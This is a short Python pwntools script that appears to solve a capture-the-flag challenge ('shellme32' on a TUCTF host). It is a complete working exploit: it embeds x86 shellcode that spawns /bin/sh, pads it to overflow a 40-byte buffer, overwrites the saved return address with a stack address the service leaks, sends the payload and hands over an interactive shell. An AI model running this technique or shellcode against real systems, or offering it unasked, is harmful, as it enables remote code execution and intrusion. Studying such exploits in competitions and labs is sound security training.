#!/usr/bin/python3

from pwn import *

#context.log_level = 'debug'

def get_shellcode():
    sc = b""
    sc += b"\x31\xc0\x50\x68\x2f\x2f\x73"
    sc += b"\x68\x68\x2f\x62\x69\x6e\x89"
    sc += b"\xe3\x89\xc1\x89\xc2\xb0\x0b"
    sc += b"\xcd\x80\x31\xc0\x40\xcd\x80"
    return sc

def generate_payload(stack_addr):
    sc = get_shellcode()

    payload = b""
    payload += sc
    payload += b"A"*(40 - len(sc))
    payload += p32(stack_addr) # eip 
    return payload


def main():
    #target = process("./shellme32")
    target = remote("chal.tuctf.com", 30506)

    target.recvuntil("Shellcode... Can you say shellcode?\n")

    leaked_stack_addr = int(target.recvline().rstrip().decode("utf-8"), 16)
    print(leaked_stack_addr)
    print(type(leaked_stack_addr))

    prompt = target.recvuntil(b"> ")

    payload = generate_payload(leaked_stack_addr)
    print(payload)
    target.sendline(payload)

    target.interactive()

main()
